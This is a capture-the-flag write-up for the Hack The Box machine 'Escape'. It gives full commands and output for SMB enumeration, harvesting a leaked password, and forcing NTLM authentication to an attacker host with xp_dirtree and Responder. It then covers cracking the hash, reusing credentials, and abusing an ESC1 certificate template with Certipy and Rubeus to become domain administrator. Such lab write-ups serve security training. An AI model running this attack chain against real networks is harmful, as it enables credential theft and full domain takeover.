---
title: 'HTB Escape - Medium'
date: 2024-05-10 02:00:00 +0000
categories: [HTB Machines]
tags: [Medium, Linux, HTB]
---
**Escape** is a medium HTB machine where you can access a MSSQL server with **credentials gathered from exposed files on shares**. There are **SQL logs containing a clear-text password** and a user that we can leveraged to move laterally. Privilege escalation to Domain Admins is achievable by exploiting a **certificate template** that is **vulnerable to ESC1**.

<img src="/assets/img/escape/Untitled.png" alt="Untitled.png" style="width:600px;">

# Reconnaissance

Started with an Nmap scan with [nmap4lazy](https://github.com/duskb1t/nmap4lazy), a simple script I created.

```bash
sudo python3 ~/Desktop/tools/nmap4lazy/nmap4lazy.py -t 10.129.228.253

[+] Scanning all TCP ports...

[+] Command being used:

/usr/bin/nmap 10.129.228.253 -p- -sS -Pn -n --min-rate 5000

[+] Open ports: 

53, 88, 135, 139, 389, 445, 464, 593, 636, 1433, 3268, 3269, 5985, 9389, 49667, 49689, 49690, 49710, 49714, 60555

[+] NSE Scan in process. This might take a while...

[+] Command being used:

/usr/bin/nmap 10.129.228.253 -sVC -p53,88,135,139,389,445,464,593,636,1433,3268,3269,5985,9389,49667,49689,49690,49710,49714,60555

Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-05-10 02:22 WEST
Nmap scan report for 10.129.228.253
Host is up (0.062s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-05-10 09:23:15Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-05-10T09:24:45+00:00; +8h00m02s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2024-05-10T09:24:46+00:00; +8h00m02s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2024-05-10T09:14:48
|_Not valid after:  2054-05-10T09:14:48
| ms-sql-ntlm-info: 
|   10.129.228.253:1433: 
|     Target_Name: sequel
|     NetBIOS_Domain_Name: sequel
|     NetBIOS_Computer_Name: DC
|     DNS_Domain_Name: sequel.htb
|     DNS_Computer_Name: dc.sequel.htb
|     DNS_Tree_Name: sequel.htb
|_    Product_Version: 10.0.17763
| ms-sql-info: 
|   10.129.228.253:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2024-05-10T09:24:45+00:00; +8h00m02s from scanner time.
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-05-10T09:24:45+00:00; +8h00m02s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
| Not valid before: 2024-01-18T23:03:57
|_Not valid after:  2074-01-05T23:03:57
|_ssl-date: 2024-05-10T09:24:46+00:00; +8h00m02s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49689/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49690/tcp open  msrpc         Microsoft Windows RPC
49710/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
60555/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-05-10T09:24:09
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 8h00m01s, deviation: 0s, median: 8h00m01s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.56 seconds

[+] Script finished successfully
```

Appended the newly discovered hostname and domain to /etc/hosts.

```bash
echo -e "10.129.228.253\tsequel.htb dc.sequel.htb" | sudo tee -a /etc/hosts
10.129.228.253  sequel.htb dc.sequel.htb
```

SMB anonymous login is enabled.

```bash
netexec smb 10.129.228.253 -u "anonymous" -p "" --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\anonymous: 
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON                        Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL                          Logon server share
```

# Exploitation

Downloaded a PDF file from the Public’s share.

```bash
smbclient -N //10.129.228.253/Public -c ls
	SQL Server Procedures.pdf           A    49551  Fri Nov 18 13:39:43 2022

smbclient -N //10.129.228.253/Public -c "get \"SQL Server Procedures.pdf\""
getting file \SQL Server Procedures.pdf of size 49551 as SQL Server Procedures.pdf (133.7 KiloBytes/sec) (average 133.7 KiloBytes/sec)
```

The PDF file contains a user and a clear-text password for a 'PublicUser' user.

```
pdftotext SQL\ Server\ Procedures.pdf pdf.txt

cat pdf.txt               
SQL Server Procedures
Since last year we've got quite few accidents with our SQL Servers (looking at you Ryan, with your instance on the DC, why should
you even put a mock instance on the DC?!).
...
Bonus
For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with
user PublicUser and password <REDACTED>.
Refer to the previous guidelines and make sure to switch the "Windows Authentication" to "SQL Server Authentication".
```

Trying out the credentials over SMB results in false positives.

```bash
netexec smb 10.129.228.253 -u PublicUser -p <REDACTED> --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\PublicUser:<REDACTED>
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED

netexec smb 10.129.228.253 -u PublicUser -p arbitrary --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\PublicUser:arbitrary 
SMB         10.129.228.253  445    DC               [-] Error enumerating shares: STATUS_ACCESS_DENIED
```

Started the Responder `sudo responder -I tun0 -v` and connected to the MSSQL server.

```
impacket-mssqlclient sequel.htb/PublicUser:<REDACTED>@10.129.228.253
```

Forcing it to authenticate to us successfully worked, stealing the SQL_SVC’s Net-NTLM hash. 

```
SQL (PublicUser  guest@master)> exec master..xp_dirtree '\\10.10.14.112\share\file'
```

<img src="/assets/img/escape/Untitled 1.png" alt="Untitled 1.png" style="width:800px;">

It was a weak password, so we could crack it.

```bash
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt

SQL_SVC::sequel:deffe7b5194a7d6...:<REDACTED>
```

NetExec confirms that the credentials are valid.

```bash
netexec smb 10.129.228.253 -u sql_svc -p <REDACTED> --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\sql_svc:<REDACTED>
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL          READ            Logon server share
```

And we also have PS Remote access.

```bash
netexec winrm 10.129.228.253 -u sql_svc -p <REDACTED>
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\sql_svc:<REDACTED> (Pwn3d!)
```

Connected over WinRM and read the… it couldn’t be that easy.

```
evil-winrm -u sql_svc -p <REDACTED> -i 10.129.228.253

*Evil-WinRM* PS C:\Users\sql_svc\Documents> whoami
sequel\sql_svc

*Evil-WinRM* PS C:\Users\sql_svc\Documents> hostname
dc

*Evil-WinRM* PS C:\Users\sql_svc\Documents> type c:\users\sql_svc\desktop\user.txt
Cannot find path 'C:\users\sql_svc\desktop\user.txt' because it does not exist.
```

# Lateral Movement

There is another user besides us called ‘Ryan.Cooper’.

```
*Evil-WinRM* PS C:\Users\sql_svc\Documents> dir c:\users\
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----         2/7/2023   8:58 AM                Administrator
	d-r---        7/20/2021  12:23 PM                Public
	d-----         2/1/2023   6:37 PM                Ryan.Cooper
	d-----         2/7/2023   8:10 AM                sql_svc
```

We SQL_SVC so we should enumerate the SQLServer’s directory.

```
*Evil-WinRM* PS C:\> dir 
  Directory: C:\
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----         2/1/2023   8:15 PM                PerfLogs
	d-r---         2/6/2023  12:08 PM                Program Files
	d-----       11/19/2022   3:51 AM                Program Files (x86)
	d-----       11/19/2022   3:51 AM                Public
	d-----         2/1/2023   1:02 PM                SQLServer
	d-r---         2/1/2023   1:55 PM                Users
	d-----         2/6/2023   7:21 AM                Windows

*Evil-WinRM* PS C:\> cd c:\SQLServer

*Evil-WinRM* PS C:\SQLServer> dir
  Directory: C:\SQLServer
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	d-----         2/7/2023   8:06 AM                Logs
	d-----       11/18/2022   1:37 PM                SQLEXPR_2019
	-a----       11/18/2022   1:35 PM        6379936 sqlexpress.exe
	-a----       11/18/2022   1:36 PM      268090448 SQLEXPR_x64_ENU.exe
```

Inspecting the ERRORLOG.BAK file for passwords shows something of interest. Apparently, the same guy that likes creating a mock instance of the DC and angered the administrator (from the previous PDF file), is a fan of using passwords as usernames! The first time I did this machine I found it to be very funny XD.

```
*Evil-WinRM* PS C:\SQLServer\Logs> ls
  Directory: C:\SQLServer\Logs
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	-a----         2/7/2023   8:06 AM          27608 ERRORLOG.BAK
	
*Evil-WinRM* PS C:\SQLServer\Logs> cat ERRORLOG.BAK | findstr /i /c:"pass"
2022-11-18 13:43:06.75 spid18s     Password policy update was successful.
2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48 Logon       Logon failed for user '<REDACTED>'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
```

<img src="/assets/img/escape/Untitled 2.png" alt="Untitled 2.png" style="width:800px;">

NetExec confirms that the credentials are valid and we can connect over WinRM.

```shell
netexec smb 10.129.228.253 -u ryan.cooper -p <REDACTED> --shares
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
SMB         10.129.228.253  445    DC               [+] sequel.htb\ryan.cooper:<REDACTED>
SMB         10.129.228.253  445    DC               [*] Enumerated shares
SMB         10.129.228.253  445    DC               Share           Permissions     Remark
SMB         10.129.228.253  445    DC               -----           -----------     ------
SMB         10.129.228.253  445    DC               ADMIN$                          Remote Admin
SMB         10.129.228.253  445    DC               C$                              Default share
SMB         10.129.228.253  445    DC               IPC$            READ            Remote IPC
SMB         10.129.228.253  445    DC               NETLOGON        READ            Logon server share 
SMB         10.129.228.253  445    DC               Public          READ            
SMB         10.129.228.253  445    DC               SYSVOL          READ            Logon server share

netexec winrm 10.129.228.253 -u ryan.cooper -p <REDACTED>
WINRM       10.129.228.253  5985   DC               [*] Windows 10 / Server 2019 Build 17763 (name:DC) (domain:sequel.htb)
WINRM       10.129.228.253  5985   DC               [+] sequel.htb\ryan.cooper:<REDACTED> (Pwn3d!)
```

This time we can read the user flag.

```
evil-winrm -u ryan.cooper -p <REDACTED> -i 10.129.228.253

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> whoami
sequel\ryan.cooper

*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> type c:\users\ryan.cooper\desktop\user.txt
67610b932ef345d8****************
```

# PrivEsc

The fact that the box is called 'Escape' led us to think about ADCS. Enumerating certificate templates doesn’t show any custom one (I believe).

```shell
netexec ldap 10.129.228.253 -u ryan.cooper -p <REDACTED> -M adcs
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.228.253  636    DC               [+] sequel.htb\ryan.cooper:<REDACTED>
ADCS        10.129.228.253  389    DC               [*] Starting LDAP search with search filter '(objectClass=pKIEnrollmentService)'
ADCS                                                Found PKI Enrollment Server: dc.sequel.htb
ADCS                                                Found CN: sequel-DC-CA

netexec ldap 10.129.228.253 -u ryan.cooper -p <REDACTED> -M adcs -o SERVER=sequel-DC-CA
SMB         10.129.228.253  445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:sequel.htb) (signing:True) (SMBv1:False)
LDAPS       10.129.228.253  636    DC               [+] sequel.htb\ryan.cooper:<REDACTED>
ADCS                                                Using PKI CN: sequel-DC-CA
ADCS        10.129.228.253  389    DC               [*] Starting LDAP search with search filter '(distinguishedName=CN=sequel-DC-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,'
ADCS                                                Found Certificate Template: UserAuthentication
...
```

Running [Certipy](https://github.com/ly4k/Certipy) shows that the ‘UserAuthentication’ template is vulnerable to ESC1.

```bash
sudo certipy-ad find -dc-ip 10.129.228.253 -u ryan.cooper@sequel.htb -p <REDACTED> -vulnerable -text -stdout
Certificate Templates
    Template Name                       : UserAuthentication
    Display Name                        : UserAuthentication
    Certificate Authorities             : sequel-DC-CA
		...
[!] Vulnerabilities
      ESC1                              : 'SEQUEL.HTB\\Domain Users' can enroll, enrollee supplies subject and template allows client authentication
```

Requested a certificate that impersonates the administrator, exploiting ESC1.

```bash
sudo certipy-ad req -template UserAuthentication -ca sequel-DC-CA -upn Administrator -dc-ip 10.129.228.253 -u ryan.cooper@sequel.htb -p <REDACTED>
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 14
[*] Got certificate with UPN 'Administrator'
[*] Certificate has no object SID
[*] Saved certificate and private key to 'administrator.pfx'
```

And... Yes. I tried to connect over WinRM HTTPS when port TCP/5986 is closed XD.

```bash
sudo certipy-ad cert -pfx administrator.pfx -nokey -out dusk.crt 
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing certificate and  to 'dusk.crt'

sudo certipy-ad cert -pfx administrator.pfx -nocert -out dusk.key
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing private key to 'dusk.key'

evil-winrm -u administrator -c dusk.crt -k dusk.key -i 10.129.228.253 --ssl
```

Uploaded the PFX certificate and [Rubeus](https://github.com/GhostPack/Rubeus) to the target box.

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> ls
  Directory: C:\Users\Ryan.Cooper\Documents
	Mode                LastWriteTime         Length Name
	----                -------------         ------ ----
	-a----        5/10/2024   3:35 AM           3048 administrator.pfx
	-a----        5/10/2024   3:40 AM         446976 Rubeus.exe
```

Requested a TGT as the administrator user.

```
*Evil-WinRM* PS C:\Users\Ryan.Cooper\Documents> .\Rubeus.exe asktgt /user:administrator /certificate:administrator.pfx /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0

[*] Action: Ask TGT

[*] Using PKINIT with etype rc4_hmac and subject: CN=Ryan.cooper
[*] Building AS-REQ (w/ PKINIT preauth) for: 'sequel.htb\administrator'
[*] Using domain controller: fe80::e07e:ce5:1e70:b86a%4:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIGSDCCBkSgAwIBBaEDAgEWooIFXjCCBVph...
```

Converted the kirbi ticket into a Keytab CCACHE file.

```bash
cat administrator.kirbi.b64 | base64 -d > administrator.kirbi

impacket-ticketConverter administrator.kirbi administrator.ccache      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] converting kirbi to ccache...
[+] done
```

And connected as the domain administrator to the DC. Read the root flag to officially pwn the box. GGs!

```
sudo rdate -n 10.129.228.253; KRB5CCNAME=administrator.ccache impacket-wmiexec sequel.htb/administrator@dc.sequel.htb -k -no-pass

C:\>whoami
sequel\administrator

C:\>hostname
dc

C:\>type c:\users\administrator\desktop\root.txt
e7c427196f0bbd7c****************
```